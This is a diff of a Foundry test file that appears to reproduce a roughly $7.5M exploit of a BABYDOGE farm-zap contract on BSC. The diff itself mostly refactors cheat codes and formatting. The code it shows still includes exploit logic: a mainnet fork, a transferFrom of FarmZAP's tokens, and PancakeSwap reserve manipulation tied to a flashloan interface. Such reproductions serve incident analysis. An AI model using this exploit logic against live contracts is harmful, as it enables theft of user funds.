@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~7.5M USD$
 // Attacker : https://bscscan.com/address/0xcbc0d0c1049eb011d7c7cfc4ff556d281f0afebb
@@ -27,12 +26,10 @@ interface IFarm {
 
 interface IFarmZAP {
 
-    function buyTokensAndDepositOnBehalf(
-        IFarm farm,
-        uint256 amountIn,
-        uint256 amountOutMin,
-        address[] calldata path
-    ) external payable returns (uint256);
+    function buyTokensAndDepositOnBehalf(IFarm farm, uint256 amountIn, uint256 amountOutMin, address[] calldata path)
+        external
+        payable
+        returns (uint256);
 
 }
 
@@ -40,20 +37,18 @@ contract ContractTest is Test {
 
     IERC20 BABYDOGE = IERC20(0xc748673057861a797275CD8A068AbB95A902e8de);
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
-    Uni_Pair_V2 Pair = Uni_Pair_V2(0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0);
+    IUniswapV2Pair Pair = IUniswapV2Pair(0xc736cA3d9b1E90Af4230BD8F9626528B3D4e0Ee0);
     IFarmZAP FarmZAP = IFarmZAP(0x451583B6DA479eAA04366443262848e27706f762);
     IAaveFlashloan Radiant = IAaveFlashloan(0xd50Cf00b6e600Dd036Ba8eF475677d816d6c4281);
     uint256 i;
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
     function setUp() public {
-        cheats.createSelectFork("bsc", 28_593_354);
-        cheats.label(address(WBNB), "WBNB");
-        cheats.label(address(BABYDOGE), "BABYDOGE");
-        cheats.label(address(Pair), "Pair");
-        cheats.label(address(FarmZAP), "FarmZAP");
-        cheats.label(address(Radiant), "Radiant");
+        vm.createSelectFork("bsc", 28_593_354);
+        vm.label(address(WBNB), "WBNB");
+        vm.label(address(BABYDOGE), "BABYDOGE");
+        vm.label(address(Pair), "Pair");
+        vm.label(address(FarmZAP), "FarmZAP");
+        vm.label(address(Radiant), "Radiant");
     }
 
     function testExploit() external {
@@ -96,7 +91,7 @@ contract ContractTest is Test {
 
     function BABYDOGEToWBNBInPancake() internal {
         (uint256 WBNBReserve, uint256 BABYReserve,) = Pair.getReserves();
-        BABYDOGE.transferFrom(address(FarmZAP), address(Pair), BABYReserve * 769 / 1000);
+        BABYDOGE.transferFrom(address(FarmZAP), address(Pair), (BABYReserve * 769) / 1000);
         uint256 amountIn = BABYDOGE.balanceOf(address(Pair)) - BABYReserve;
         uint256 amountOut = (9975 * amountIn * WBNBReserve) / (10_000 * BABYReserve + 9975 * amountIn);
         Pair.swap(amountOut, 0, address(this), new bytes(0));
@@ -104,7 +99,7 @@ contract ContractTest is Test {
 
     function WBNBToBABYDOGEInPancake() internal {
         (uint256 WBNBReserve, uint256 BABYReserve,) = Pair.getReserves();
-        WBNB.transfer(address(Pair), WBNBReserve * 767 / 1000);
+        WBNB.transfer(address(Pair), (WBNBReserve * 767) / 1000);
         uint256 amountIn = WBNB.balanceOf(address(Pair)) - WBNBReserve;
         uint256 amountOut = (9975 * amountIn * BABYReserve) / (10_000 * WBNBReserve + 9975 * amountIn);
         Pair.swap(0, amountOut, address(FarmZAP), new bytes(0));
